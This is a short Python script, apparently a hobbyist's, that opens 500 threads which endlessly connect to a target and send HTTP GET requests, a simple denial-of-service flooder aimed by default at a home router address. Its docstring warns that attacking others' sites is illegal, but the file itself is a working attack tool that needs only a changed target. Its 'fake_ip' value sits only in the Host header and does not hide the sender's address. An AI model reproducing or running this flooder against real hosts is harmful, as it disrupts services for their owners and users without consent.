# -*- coding: utf-8 -*-
"""
Created on Thu Jan 14 14:54:13 2021

@author: Samir

This script is purely for own testing purposes. Use it for your own testing.
Doing DDOS attacks on other people's websites without their permission is illegal.
"""

import threading
import socket

target = '192.168.1.1' # DDOSing my router, use ipconfig to know your address and then use gateway address
port = 80
fake_ip = '192.31.30.42' # enter any ip address

connections_so_far = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /"+ target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: "+ fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        
        global connections_so_far
        connections_so_far += 1
        if connections_so_far % 500 == 0:
            print(connections_so_far)
        
for i in range(500):
    thread = threading.Thread(target = attack)
    thread.start()